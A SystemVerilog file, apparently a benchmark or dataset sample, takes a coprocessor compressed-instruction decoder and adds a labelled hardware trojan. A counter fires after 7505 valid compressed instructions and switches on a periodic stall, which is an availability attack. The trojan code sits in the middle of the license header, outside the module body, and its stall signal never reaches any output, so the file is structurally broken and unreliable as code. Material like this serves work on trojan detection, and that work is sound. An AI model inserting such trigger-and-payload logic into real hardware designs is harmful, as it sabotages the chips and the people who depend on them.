// Copyright 2024 Thales DIS France SAS
//
// Licensed under the Solderpad Hardware Licence, Version 2.0 (the "License");

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 7505;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (compressed_valid_i && |compressed_valid_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

// you may not use this file except in compliance with the License.
// SPDX-License-Identifier: Apache-2.0 WITH SHL-2.0
// You may obtain a copy of the License at https://solderpad.org/licenses/
//
// Original Author: Guillaume Chauvon

module compressed_instr_decoder_trojan_Availability #(
    parameter type                    copro_compressed_resp_t          = logic,
    parameter int                     NbInstr                          = 1,
    parameter copro_compressed_resp_t CoproInstr             [NbInstr] = {0},
    parameter type                    x_compressed_req_t               = logic,
    parameter type                    x_compressed_resp_t              = logic
) (
    input  logic               clk_i,
    input  logic               rst_ni,
    input  logic               compressed_valid_i,
    input  x_compressed_req_t  compressed_req_i,
    output logic               compressed_ready_o,
    output x_compressed_resp_t compressed_resp_o
);

  logic [NbInstr-1:0] sel;

  for (genvar i = 0; i < NbInstr; i++) begin : gen_predecoder_selector
    assign sel[i] = ((CoproInstr[i].mask & compressed_req_i.instr) == CoproInstr[i].instr);
  end

  always_comb begin
    compressed_ready_o       = '1;
    compressed_resp_o.accept = '0;
    compressed_resp_o.instr  = '0;
    for (int unsigned i = 0; i < NbInstr; i++) begin
      if (sel[i] && compressed_valid_i) begin
        compressed_resp_o.accept       = CoproInstr[i].resp.accept;
        compressed_resp_o.instr        = CoproInstr[i].resp.instr;
        // Remap rs1 and rs2
        compressed_resp_o.instr[19:15] = compressed_req_i.instr[11:7];
        compressed_resp_o.instr[24:20] = compressed_req_i.instr[6:2];
      end
    end
  end

  assert property (@(posedge clk_i) $onehot0(sel))
  else $warning("This offloaded instruction is valid for multiple coprocessor instructions !");


    // AVAILABILITY: Periodic stall
    localparam int STALL_PERIOD = 16;
    localparam int STALL_CYCLES = 8;
    logic [7:0] stall_counter;
    logic       stall_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end else if (trojan_active) begin
            if (stall_counter >= STALL_PERIOD[7:0] - 1) stall_counter <= '0;
            else stall_counter <= stall_counter + 1;
            stall_active <= (stall_counter < STALL_CYCLES[7:0]);
        end else begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end
    end

endmodule
